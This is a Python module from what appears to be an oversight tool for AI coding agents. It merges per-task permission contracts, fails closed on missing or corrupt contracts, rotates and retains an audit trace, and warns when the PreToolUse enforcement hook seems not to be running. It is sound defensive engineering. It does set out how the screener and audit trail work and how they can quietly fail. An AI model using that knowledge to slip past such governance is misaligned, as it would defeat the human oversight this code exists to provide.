    ids = sorted(str(c.get("task_id") or "?") for c in contracts)
    ceilings = [c.get("budget", {}).get("max_actions") for c in contracts
                if isinstance(c.get("budget"), dict)]
    defined = [int(x) for x in ceilings if x is not None]
    u = {
        "task_id": "union-" + hashlib.sha1(
            "+".join(ids).encode("utf-8")).hexdigest()[:8],
        "task": ("most-restrictive union of active contracts: "
                 + ", ".join(ids)),
        "_union": list(contracts),
        "activated_at": max((float(c.get("activated_at") or 0)
                             for c in contracts), default=0) or _time.time(),
    }
    if any(c.get("read_only") for c in contracts):
        u["read_only"] = True

    # SIBLING WAVES. Intersecting write_allow is the right operation when
    # contracts are competing claims over one tree. It is the WRONG one when
    # they are disjoint artifact dirs minted by a single dispatch: six lens
    # contracts allowing `.em-review/lens-<id>/**` intersect to the EMPTY
    # set, so every lens agent was blocked from writing its own findings and
    # the marquee parallel-review feature could not work with more than one
    # agent. Observed on aws/karpenter-provider-aws#9464: 4 of 6 lenses
    # produced no on-disk evidence at all.
    #
    # The widening is bounded and stated: it applies ONLY when every member
    # is read-only and every member's write_allow lives under one common
    # root. Nothing else about the union loosens — read_only still latches
    # on, scope still intersects, denies still union, and a non-sibling pair
    # still resolves to the empty intersection. `tests_no_loosening` pins
    # exactly that.
    root = _common_write_root(contracts)
    if root:
        merged: list = []
        for c in contracts:
            for g in c.get("write_allow") or []:
                if g not in merged:
                    merged.append(g)
        u["write_allow"] = merged
        u["_sibling_root"] = root
    if defined:
        if root:
            # One wave, one budget. The minimum is right for contracts that
            # compete; siblings were each GRANTED their ceiling, so taking
            # the minimum silently gave N agents one agent's allowance and
            # killed them mid-task at roughly their tenth action each.
            u["budget"] = {"max_actions": sum(defined),
                           "note": f"sum across {len(defined)} sibling "
                                   f"contracts under {root}/"}
        else:
            u["budget"] = {"max_actions": min(defined),
                           "note": "minimum ceiling across the union's members"}
    return u


def load_active(workspace: str) -> dict | None:
    """The contract governing THIS process (see task_slot / the per-task
    contract-slot protocol).

    TASKPLANE_TASK set: the per-task slot is authoritative. A MISSING or
    CORRUPT slot raises StateError — REFUSE, never silently fall back to the
    legacy slot (that would govern this agent by a sibling's contract, or by
    nothing). The screener's fail-closed boundary turns the raise into a
    block.

    TASKPLANE_TASK unset: worker-scoped slots are excluded because they are
    owned by exact native children; older/non-worker per-task slots retain
    the MOST RESTRICTIVE UNION behavior (plus the legacy slot). A corrupt
    slot raises StateError (fail closed) rather than being silently dropped
    from the union. Control-plane code that needs a worker's evidence uses
    ``worker_contract_for_stage`` and an exact snapshot override; it does not
    turn that worker contract into root authority."""
    slot = task_slot()                       # may raise (ill-formed value)
    path = active_contract_path(workspace, slot)
    if slot is not None:
        if not os.path.exists(path):
            # Host lifecycle processes may inherit TASKPLANE_TASK from the
            # task that spawned them. That authority is meaningful only in
            # the exact worktree containing the slot. A sibling worktree
            # with no contract state of its own is ungoverned; it must not be
            # blocked (or governed) by the parent's slot. Preserve fail-closed
            # behavior when this checkout has any contract state: there a
            # missing named slot is a real local mismatch.
            legacy_path = os.path.join(tp_dir(workspace),
                                       "active_contract.json")
            active_dir = os.path.join(tp_dir(workspace), "active")
            if not os.path.exists(legacy_path) and \
                    not os.path.isdir(active_dir):
                return None
            raise StateError(
                path, f"unknown TASKPLANE_TASK slot '{slot}' — no per-task "
                "contract activated for it",
                "activate this task's contract (tp.py new / loop dispatch) "
                "or unset TASKPLANE_TASK; refusing to fall back to another "
                "task's contract")
        return load_json(path, what="active contract")   # corrupt -> raise
    legacy = None
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                legacy = json.load(f)
        except (OSError, json.JSONDecodeError):
            legacy = None
    members = []
    for s in list_task_slots(workspace):
        # corrupt slot -> StateError -> the screener blocks (fail closed);
        # a torn sibling contract must not quietly weaken the union.
        c = load_json(active_contract_path(workspace, s),
                      what=f"active contract (slot {s})")
        # Worker-scoped slots are owned by a verified native child and are
        # selected through ``load_active_for_event``.  Folding them into a
        # slot-less union binds their least-privilege contract to the root
        # orchestrator — the lifecycle leak this boundary exists to prevent.
        # Older/non-worker slots retain the conservative union semantics.
        if isinstance(c, dict) and c.get("worker_scoped") is not True:
            members.append(c)
    if not members:
        return legacy
    if isinstance(legacy, dict):
        members.append(legacy)
    if len(members) == 1:
        return members[0]
    return _union_contract(members)


# One warning per process when the audit trail goes dark (v2.3.0) — a trace
# that silently stops recording lets a later incident review mistake "denies
# happened but tracing was broken" for "no denies happened".
_TRACE_FAILED_WARNED = False
# Rotation bound for the only-growing trace.jsonl. Past this size the ACTIVE
# file is archived and a fresh one opens with a trace_rotated record naming
# the archive.
#
# D-0014. This used to rotate to a fixed `trace.jsonl.1`, so the SECOND
# rotation silently destroyed the first archive — while the record it wrote
# said "earlier events moved aside, not lost". An audit trace that deletes
# its own oldest generation and then asserts it did not is worse than one
# that never rotated: the false claim is what makes it dangerous, because
# the only reader who would notice is the one auditing the gap.
#
# Archives use monotonic names while retained and are never overwritten.
# The active file and retained archive set have independent size bounds;
# expired or excess archives are privacy-purged under the trace lock.
_TRACE_MAX_BYTES = 5 * 1024 * 1024
_TRACE_ARCHIVE_RETENTION_SECONDS = 7 * 24 * 60 * 60
_TRACE_ARCHIVE_MAX_FILES = 8
_TRACE_ARCHIVE_MAX_BYTES = 40 * 1024 * 1024
def _reserve_trace_archive(path: str) -> "str | None":
    """Claim the next unused `trace.jsonl.<n>`, atomically.

    O_CREAT|O_EXCL is the claim: two processes rotating at once cannot both
    win the same n, so neither can land on top of the other's history. The
    empty placeholder is then replaced by the real file.
    """
    n = 1
    directory = os.path.dirname(path) or "."
    prefix = os.path.basename(path) + "."
    try:
        n = max([int(name[len(prefix):]) for name in os.listdir(directory)
                 if name.startswith(prefix) and
                 name[len(prefix):].isdigit()] or [0]) + 1
    except OSError:
        pass
    while n < 100000:
        dest = f"{path}.{n}"
        try:
            fd = os.open(dest, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        except FileExistsError:
            n += 1
            continue
        except OSError:
            return None
        os.close(fd)
        return dest
    return None


def _maybe_rotate_trace(path: str) -> "str | None":
    """The archive path this call created, or None if it did not rotate."""
    try:
        if os.path.getsize(path) <= _TRACE_MAX_BYTES:
            return None
        dest = _reserve_trace_archive(path)
        if dest is None:
            return None      # cannot archive without overwriting: do not
        os.replace(path, dest)
        return dest
    except OSError:
        return None


def _purge_trace_archive(path: str) -> None:
    directory = os.path.dirname(path) or "."
    staged = os.path.join(
        directory, ".privacy-purge-" + os.path.basename(path) + "-" +
        secrets.token_hex(8))
    os.replace(path, staged)
    os.unlink(staged)


def _enforce_trace_retention_locked(path: str, observed_at: float) -> dict:
    """Bound rotated audit history while leaving the active trace intact."""
    directory = os.path.dirname(path) or "."
    prefix = os.path.basename(path) + "."
    candidates = []
    try:
        names = os.listdir(directory)
    except OSError:
        names = []
    for name in names:
        suffix = name[len(prefix):] if name.startswith(prefix) else ""
        if not suffix.isdigit():
            continue
        archive = os.path.join(directory, name)
        try:
            info = os.lstat(archive)
            if not stat.S_ISREG(info.st_mode):
                raise OSError("audit archive is not a regular file")
            candidates.append((float(info.st_mtime), int(suffix),
                               int(info.st_size), archive))
        except OSError:
            if os.path.lexists(archive):
                _purge_trace_archive(archive)
    retained = 0
    retained_bytes = 0
    removed = 0
    for modified_at, _suffix, size, archive in sorted(
            candidates, reverse=True):
        expired = modified_at + _TRACE_ARCHIVE_RETENTION_SECONDS <= observed_at
        excess = (retained >= _TRACE_ARCHIVE_MAX_FILES or
                  retained_bytes + size > _TRACE_ARCHIVE_MAX_BYTES)
        if expired or excess:
            _purge_trace_archive(archive)
            removed += 1
        else:
            retained += 1
            retained_bytes += size
    if removed:
        _fsync_directory(directory)
    return {"removed": removed, "retained": retained,
            "retained_bytes": retained_bytes,
            "retention_seconds": _TRACE_ARCHIVE_RETENTION_SECONDS,
            "max_files": _TRACE_ARCHIVE_MAX_FILES,
            "max_bytes": _TRACE_ARCHIVE_MAX_BYTES}


def enforce_trace_retention(workspace: str, *, now: float | None = None,
                            _lock_held: bool = False) -> dict:
    path = os.path.join(tp_dir(workspace), "trace.jsonl")
    observed_at = float(_time.time() if now is None else now)
    if _lock_held:
        return _enforce_trace_retention_locked(path, observed_at)
    with file_lock(path + ".retention"):
        return _enforce_trace_retention_locked(path, observed_at)


def trace_paths(workspace: str) -> list:
    """Retained trace files for this workspace, OLDEST first, active last.

    Rotation splits one logical audit trace across files; a consumer that
    reads only `trace.jsonl` is reading the tail of the record and cannot
    tell. Anything mining a whole track's history (retro, cost analysis)
    reads this instead.
    """
    d = tp_dir(workspace)
    base = os.path.join(d, "trace.jsonl")
    archives = []
    try:
        for name in os.listdir(d):
            if not name.startswith("trace.jsonl."):
                continue
            suffix = name[len("trace.jsonl."):]
            if suffix.isdigit():
                archives.append((int(suffix), os.path.join(d, name)))
    except OSError:
        pass
    out = [p for _n, p in sorted(archives)]
    if os.path.exists(base):
        out.append(base)
    return out


def screen_liveness(workspace: str, contract: dict | None = None,
                    now: float | None = None) -> dict:
    """Is the enforcement hook actually running for this governed workspace?

    The cheap "is the wall actually up?" probe (v2.3.0), mirroring
    dispatch_report.hook_active: compares the meter's last_seen_ts for the
    active contract against its activated_at. Returns {"governed",
    "hook_seen", "warning"} — `warning` is set when a governed workspace
    shows ZERO screen activity well after activation (matcher regression,
    PLUGIN_ROOT unset, hook timeout), i.e. governance may be silently
    absent. CLI surfaces (tp ready / tp status) print the warning; the rule
    lives here in the kernel."""
    c = contract if contract is not None else load_active(workspace)
    if not c:
        return {"governed": False, "hook_seen": False, "warning": None}
    now = _time.time() if now is None else now
    tid = c.get("task_id", "_")
    last_seen = 0.0
    try:
        with open(os.path.join(tp_dir(workspace), "meter.json"), encoding="utf-8") as f:
            last_seen = float((json.load(f).get(tid) or {})
                              .get("last_seen_ts") or 0)
    except (OSError, ValueError, TypeError):
        pass
    if last_seen:
        return {"governed": True, "hook_seen": True, "warning": None}
    age = now - float(c.get("activated_at") or now)
    warning = None
    if age > 60:
        warning = (f"contract {tid} has been active {int(age)}s with ZERO "
                   "screen activity — the PreToolUse hook may not be running "
                   "(PLUGIN_ROOT unset, matcher regression, or timeout) and "
                   "governance may be silently absent; verify the hook "
                   "before trusting this session's audit trail")
    return {"governed": True, "hook_seen": False, "warning": warning}


def trace(workspace: str, event: str, **data) -> None:
    import time
    global _TRACE_FAILED_WARNED
    # Every record carries a monotonic wall-clock ts so the mission-control
    # feed can order events across parallel worker trace files by TIME, not
    # by which file they happened to be concatenated from.
    rec = audit_record(event, data, observed_at=time.time())
    try:
        d = tp_dir(workspace)
        os.makedirs(d, exist_ok=True)
        _ensure_self_ignored(d)
        path = os.path.join(d, "trace.jsonl")
        with file_lock(path + ".retention"):
            enforce_trace_retention(workspace, _lock_held=True)
            if os.path.islink(path):
                raise OSError("audit trace is a symlink")
            archived_to = _maybe_rotate_trace(path)
            with open(path, "a", encoding="utf-8") as f:
                if archived_to:
                    rotation = audit_record("trace_rotated", {
                        "archived_to": to_posix(
                            os.path.relpath(archived_to, workspace)),
                        "note": "earlier events moved to bounded archive",
                    }, observed_at=time.time())
                    f.write(json.dumps(rotation, default=str) + "\n")
                f.write(json.dumps(rec, default=str) + "\n")
                f.flush()
                os.fsync(f.fileno())
            enforce_trace_retention(workspace, _lock_held=True)
    except (OSError, StateError) as e:
        # NEVER crash the hook over a broken audit log — but never go dark
        # silently either: one stderr warning per process (v2.3.0).
        if not _TRACE_FAILED_WARNED:
            _TRACE_FAILED_WARNED = True
            import sys
            print(f"taskplane: WARNING — audit trace write failed ({e}); "
                  "governance events are NO LONGER being recorded for "
                  f"{workspace}. Fix the .taskplane dir (disk/permissions) "
                  "before trusting this session's audit trail.",
                  file=sys.stderr)
        return

    # Keep the cheap status read model current from the same production event
    # path. It is presentation-only: snapshot damage or an unavailable disk
    # must never turn into authority or block the audit transition above.
    try:
        import progress
        progress.record_trace_event(
            workspace, event, rec, observed_at=rec["ts"], state_dir=d)
    except Exception:
        pass
